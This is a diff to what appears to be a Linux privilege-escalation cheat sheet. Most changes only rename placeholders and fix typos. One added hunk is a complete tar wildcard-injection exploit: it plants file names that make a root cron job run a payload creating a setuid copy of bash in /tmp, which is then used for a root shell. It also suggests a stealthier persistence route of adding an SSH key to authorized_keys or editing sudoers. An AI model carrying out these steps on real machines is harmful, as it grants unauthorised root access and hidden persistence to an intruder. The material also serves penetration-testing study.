@@ -101,7 +101,7 @@ ps aux | grep "^root"
 lsof +L1
 ```
 
-```bash [/etc/proc]
+```bash [/proc]
 ls -la /proc/*/exe 2>/dev/null
 cat /proc/*/cmdline 2>/dev/null | tr '\0' ' '
 ```
@@ -120,8 +120,8 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ### Files by User / Group
 
 ```bash
-find / -type f -user $user -exec ls -l {} + 2>/dev/null
-find / -group $group 2>/dev/null
+find / -type f -user $USER -exec ls -l {} + 2>/dev/null
+find / -group $GROUP 2>/dev/null
 ```
 
 ## 🔧 Capabilities
@@ -142,7 +142,7 @@ cat /proc/self/status | grep Cap
 Execute command with different primary group
 
 ```bash
-sg $group -c "command"
+sg $GROUP -c "$COMMAND"
 ```
 
 ## ⚡ sudo
@@ -159,10 +159,10 @@ sudo su -
 sudo -i
 
 # sudo -u to exec command with specific user
-sudo -u <user> <command> [option]
+sudo -u $USER $COMMAND [option]
 
 # use many command with sudo -u
-echo '<COMMAND>' | sudo -u <user> tee -a file
+echo '$COMMAND' | sudo -u $USER tee -a file
 ```
 
 ## ⏰ Cron Jobs
@@ -178,8 +178,16 @@ systemctl list-timers --all
 
 ```bash
 # If cron runs `tar cf /backup.tar *` in writable dir
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > payload.sh
+chmod +x payload.sh
+
 touch -- "--checkpoint=1"
-touch -- "--checkpoint-action=exec=/bin/sh"
+touch -- "--checkpoint-action=exec=sh payload.sh"
+
+# Wait for the cron job to fire, then:
+/tmp/rootbash -p # -p keeps the inherited setuid bit, bash drops it by default
+
+# Stealthier alternative to a dropped SUID binary: have payload.sh add your key to authorized_keys or edit sudoers instead
 ```
 
 ## 🔐 Searching Credentials & Sensitive Data
@@ -232,5 +240,5 @@ find / -type d -perm -0002 -perm -1000 2>/dev/null
 ```bash
 lsblk -f
 mount | grep -E "nfs|bind"  # NFS
-cat /etc/fstab              # Persistant mounted point
+cat /etc/fstab              # Persistent mounted point
 ```
